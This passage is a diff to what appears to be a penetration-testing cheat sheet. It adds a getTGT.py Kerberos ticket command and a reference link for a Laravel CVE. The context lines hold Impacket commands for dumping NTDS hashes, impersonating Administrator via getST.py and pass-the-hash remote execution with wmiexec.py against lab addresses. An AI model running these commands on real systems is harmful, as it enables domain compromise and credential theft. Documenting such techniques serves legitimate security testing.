@@ -1797,6 +1797,9 @@ $ secretsdump.py -ntds ntds.dit -system system.hive local -outputfile dump.txt
 $ getST.py -spn MSSQL/DC01.BANK.LOCAL 'BANK.LOCAL/nik:password' -impersonate Administrator -dc-ip 10.10.10.10
 $ getST.py -spn MSSQL/DC01.BANK.LOCAL 'BANK.LOCAL/nik' -impersonate Administrator -dc-ip 10.10.10.10 -hashes ':2182eed0101516d0ax06b98c579x65e6'
 
+=> getTGT.py
+$ getTGT.py -dc-ip 10.10.10.10 bank.local/nik:'Passw0rd@123!'
+
 => wmiexec.py
 $ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
 $ wmiexec.py -hashes :0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
@@ -3376,6 +3379,7 @@ su root
 
 # References
 https://github.com/kozmic/laravel-poc-CVE-2018-15133
+https://snyk.io/vuln/SNYK-PHP-LARAVELFRAMEWORK-174581
 ```
 
 ### OpenSMPTD < 6 (Local Privesc)
